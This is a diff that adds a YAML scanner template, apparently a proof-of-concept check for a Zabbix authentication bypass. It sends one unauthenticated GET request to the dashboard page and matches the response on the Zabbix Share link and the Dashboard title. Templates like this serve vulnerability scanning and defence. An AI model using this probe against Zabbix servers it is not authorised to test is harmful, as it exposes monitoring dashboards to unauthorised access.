@@ -1,0 +1,23 @@
+id: poc-yaml-zabbix-authentication-bypass
+info:
+  name: Zabbix Authentication Bypass
+  severity: high
+  tags:
+  - 认证绕过
+  finger: zabbix
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /zabbix.php?action=dashboard.view&dashboardid=1
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "<a class=\"top-nav-zbbshare\"
+    target=\"_blank\" title=\"Zabbix Share\" href=\"https://share.zabbix.com/\">Share</a>")
+    && contains(body, "<title>Dashboard</title>")
+  output: []
